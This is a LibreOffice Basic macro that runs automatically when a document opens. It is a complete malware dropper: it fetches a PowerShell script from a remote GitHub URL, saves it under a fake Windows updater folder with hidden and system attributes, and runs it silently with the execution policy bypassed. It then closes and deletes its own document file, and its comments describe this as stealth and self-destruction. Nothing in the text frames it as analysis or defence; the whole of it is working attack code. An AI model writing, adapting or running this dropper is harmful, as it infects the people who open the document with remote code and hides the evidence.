REM  *****  BASIC  *****
Sub Auto_Open()
    Dim scriptUrl As String
    Dim savePath As String
    Dim functionAccess As Object
    Dim webContent As String
    
    ' Set the URL of your PowerShell script
    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/vbs32"
    
    ' Get current username dynamically
    Dim currentUser As String
    currentUser = Environ("USERNAME")
    
    ' Build path with current user  
    Dim folderPath As String
    folderPath = "C:\Users\" & currentUser & "\AppData\Local\Microsoft\Updater\WinTask\SysUpdateTask\"
    savePath = folderPath & "vbs32.ps1"
    
    ' Create directory structure if it doesn't exist
    Shell "cmd.exe /c if not exist """ & folderPath & """ mkdir """ & folderPath & """", 0, "", True
    
    On Error GoTo ErrorHandler
    
    ' Use LibreOffice's built-in WEBSERVICE function to download
    Set functionAccess = createUnoService("com.sun.star.sheet.FunctionAccess")
    webContent = functionAccess.callFunction("WEBSERVICE", Array(scriptUrl))
    
    ' Check if we got content
    If Len(webContent) > 0 Then
        ' Save the script content to file
        Dim fileHandle As Integer
        fileHandle = FreeFile
        Open savePath For Output As #fileHandle
        Print #fileHandle, webContent
        Close #fileHandle
        
        ' Set file attributes to Hidden + System (makes it invisible in normal view)
        Shell "cmd.exe /c attrib +H +S """ & savePath & """", 0, "", False
        
        ' Run the PowerShell script completely hidden - no messages, completely silent
        Dim result As Integer
        Dim cmdLine As String
        Dim currentDocPath As String
        
        ' Get document path BEFORE closing (important!)
        currentDocPath = ConvertFromURL(ThisComponent.getURL())
        
        ' Use cmd.exe with hidden window - this method works
        cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
        result = Shell(cmdLine, 0, "", False)  ' Set bSync to False to avoid blocking
        
        ' Wait a moment for PowerShell to start
        Wait 1000
        
        ' ALWAYS self-destruct after launching (regardless of result)
        ' Because hidden processes don't return reliable exit codes
        
        ' Close the current document without saving
        On Error Resume Next
        ThisComponent.close(False)
        
        ' Delete the LibreOffice document file permanently
        If currentDocPath <> "" Then
            Kill currentDocPath
        End If
        
        ' If Kill doesn't work, try system delete
        If Dir(currentDocPath) <> "" Then
            Shell "cmd.exe /c del """ & currentDocPath & """", 0, "", False
        End If
        
    Else
        ' Silent failure - no error messages for stealth operation
        GoTo Cleanup
    End If
    
Cleanup:
    ' Clean up objects
    On Error Resume Next
    Set functionAccess = Nothing
    On Error GoTo 0
    Exit Sub
    
ErrorHandler:
    ' Silent error handling - no popups for stealth operation
    GoTo Cleanup
End Sub
